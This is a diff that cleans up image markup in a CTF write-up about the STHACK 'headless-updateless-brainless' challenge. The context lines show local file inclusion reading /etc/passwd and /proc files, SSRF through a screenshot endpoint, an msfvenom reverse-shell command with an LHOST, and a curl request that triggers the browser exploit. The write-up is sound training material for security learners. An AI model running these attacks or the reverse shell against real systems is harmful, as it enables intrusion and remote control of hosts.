@@ -18,7 +18,7 @@ And this time, it worked great!
 
 The challenge URL displays the following page:
 
-![](https://www.opencyber.com/wp-content/uploads/2022/05/chall_web_first_page-1.png){.wp-image-3704}
+![](https://www.opencyber.com/wp-content/uploads/2022/05/chall_web_first_page-1.png)
 
 The parameter **file** seems very interesting.
 
@@ -27,17 +27,14 @@ The parameter **file** seems very interesting.
 The first try was to inject some local files into the parameter file,
 like \"/etc/passwd\".
 
-![](https://www.opencyber.com/wp-content/uploads/2022/05/CHALL_LFI_3-3.png){.wp-image-3707
-data-id="3707"
-full-url="https://www.opencyber.com/wp-content/uploads/2022/05/CHALL_LFI_3-3.png"
-data-link="https://www.opencyber.com/?attachment_id=3707"}
+![](https://www.opencyber.com/wp-content/uploads/2022/05/CHALL_LFI_3-3.png)
 
 As you can see, there is a user **chrome**. Maybe an hint for one next
 step!
 
 Next file: **/proc/mounts**
 
-![](https://www.opencyber.com/wp-content/uploads/2022/05/CHALL_LFI_0-1.png){.wp-image-3708}
+![](https://www.opencyber.com/wp-content/uploads/2022/05/CHALL_LFI_0-1.png)
 
 There is the file **flag_random_name\_\*** in the root directory. But it
 is not reachable directly with this first vulnerability. You will\
@@ -49,7 +46,7 @@ here.
 Next file: **/proc/self/cmdline**. This file is interesting to
 understand what the comand line of the current process is doing:
 
-![](https://www.opencyber.com/wp-content/uploads/2022/05/CHALL_LFI_1-1.png){.wp-image-3709}
+![](https://www.opencyber.com/wp-content/uploads/2022/05/CHALL_LFI_1-1.png)
 
 This is actually \"node chall.js\". The filename is **chall.js** which
 may be located in the /site directory. Let\'s leak it using the same\
@@ -58,36 +55,27 @@ vulnerability.
 The bellow part of the source code shows why it is not possible to reach
 the flag file using the first vulnerability.
 
-![](https://www.opencyber.com/wp-content/uploads/2022/05/FLAG_FORBID-1.png){.wp-image-3710}
+![](https://www.opencyber.com/wp-content/uploads/2022/05/FLAG_FORBID-1.png)
 
 By analyzing the rest of the source code, we can notice a new endpoint
 which is **\"/coolish-unguessable-feature\"**.
 
-![](https://www.opencyber.com/wp-content/uploads/2022/05/CHALL_LFI_4-1.png){.wp-image-3711}
+![](https://www.opencyber.com/wp-content/uploads/2022/05/CHALL_LFI_4-1.png)
 
 Let\'s reach it:
 
-![](https://www.opencyber.com/wp-content/uploads/2022/05/PART2_GET2-1.png){.wp-image-3712
-data-id="3712"
-full-url="https://www.opencyber.com/wp-content/uploads/2022/05/PART2_GET2-1.png"
-data-link="https://www.opencyber.com/?attachment_id=3712"}
+![](https://www.opencyber.com/wp-content/uploads/2022/05/PART2_GET2-1.png)
 
 Reading the source code, a new parameter **\"url\"** can be added to the
 URL:
 
-![](https://www.opencyber.com/wp-content/uploads/2022/05/LEAK_CODE_1-1.png){.wp-image-3715
-data-id="3715"
-full-url="https://www.opencyber.com/wp-content/uploads/2022/05/LEAK_CODE_1-1.png"
-data-link="https://www.opencyber.com/?attachment_id=3715"}
+![](https://www.opencyber.com/wp-content/uploads/2022/05/LEAK_CODE_1-1.png)
 
 The parameter needs to start with **\"http\"** in order to take a
 screenshot of the remote page. The **takeScreenshot** function is the\
 following:
 
-![](https://www.opencyber.com/wp-content/uploads/2022/05/LEAK_CODE_2-2-1024x169.png){.wp-image-3714
-data-id="3714"
-full-url="https://www.opencyber.com/wp-content/uploads/2022/05/LEAK_CODE_2-2.png"
-data-link="https://www.opencyber.com/?attachment_id=3714"}
+![](https://www.opencyber.com/wp-content/uploads/2022/05/LEAK_CODE_2-2-1024x169.png)
 
 The parameter **url** is controlled by the user. Let\'s try to make the
 application reach ourself using the following payload:
@@ -96,13 +84,9 @@ application reach ourself using the following payload:
 http://headless-updateless-brainless.sthack.fr/coolish-unguessable-feature?url=http://IP:PORT/test
 ```
 
-![](https://www.opencyber.com/wp-content/uploads/2022/05/CHALL_BROWSER_OUTDATED-1024x214.png){.wp-image-3716
-data-id="3716"
-full-url="https://www.opencyber.com/wp-content/uploads/2022/05/CHALL_BROWSER_OUTDATED.png"
-data-link="https://www.opencyber.com/?attachment_id=3716"}
+![](https://www.opencyber.com/wp-content/uploads/2022/05/CHALL_BROWSER_OUTDATED-1024x214.png)
 
-We retrieve the Chrome version which seems very interesting (and not up
-to date).
+We retrieve the Chrome version which seems very interesting (and not up to date).
 
 ## Browser vulnerability - Recon
 
@@ -137,7 +121,7 @@ msfvenom -p linux/x64/shell_reverse_tcp -a x64 --platform linux LHOST=192.168.12
 Let\'s change the shellcode by using a vim trick to add 0x before the
 hexa value, and a comma:
 
-![](https://www.opencyber.com/wp-content/uploads/2022/05/SC_MSFVENOM-1-1024x100.png){.wp-image-3717}
+![](https://www.opencyber.com/wp-content/uploads/2022/05/SC_MSFVENOM-1-1024x100.png)
 
 This will take two values of hexa, add a prefix **,0x** to the pattern
 found from the regex, which gives:
@@ -171,10 +155,7 @@ curl http://192.168.122.141:8082/coolish-unguessable-feature?url=http://:192.168
 The exploit.html file is reached which lead to exploit the vulnerability
 that gives us a shell:
 
-![](https://www.opencyber.com/wp-content/uploads/2022/05/RCE-1.png){.wp-image-3718
-data-id="3718"
-full-url="https://www.opencyber.com/wp-content/uploads/2022/05/RCE-1.png"
-data-link="https://www.opencyber.com/?attachment_id=3718"}
+![](https://www.opencyber.com/wp-content/uploads/2022/05/RCE-1.png)
 
 Thus the flag was\... Oops, cannot say, did not get the one during the
 night!
@@ -183,5 +164,5 @@ Thanks **[Laluka](https://twitter.com/TheLaluka)** for the challenge and
 the [STHACK](https://sthack.fr) for the event!\
 \
 The challenges have been made public and can be found here:
-[https://gitlab.com/TheLaluka/headless-updateless-brainless](https://gitlab.com/TheLaluka/headless-updateless-brainless){target="_blank"
-rel="noreferrer noopener"}
+[https://gitlab.com/TheLaluka/headless-updateless-brainless](https://gitlab.com/TheLaluka/headless-updateless-brainless)
+
